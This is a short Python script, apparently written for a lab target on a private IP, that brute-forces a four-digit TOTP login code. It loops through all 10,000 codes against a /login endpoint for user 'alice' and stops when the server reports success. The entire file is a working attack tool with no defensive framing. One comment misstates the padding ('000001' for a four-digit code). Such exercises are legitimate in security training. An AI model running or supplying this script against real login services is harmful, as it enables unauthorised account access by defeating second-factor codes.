import requests
from tqdm import tqdm  # make sure you've run: pip install tqdm

server_ip = 'http://192.168.81.147:5000'  # Replace with actual IP address
user = 'alice'
login_url = f"{server_ip}/login"

for code in tqdm(range(10000), desc="Brute-forcing TOTP code"):
    code_str = f"{code:04d}"  # Pads with zeros (e.g., 000001)

    params = {'user': user, 'code': code_str}
    try:
        response = requests.get(login_url, params=params, timeout=1)

        if response.text.strip() == "Login successful":
            print(f"\n[+] SUCCESS! Code: {code_str}")
            print(f"Server Response: {response.text}")
            break

    except requests.exceptions.RequestException as e:
        print(f"[!] Error trying code {code_str}: {e}")

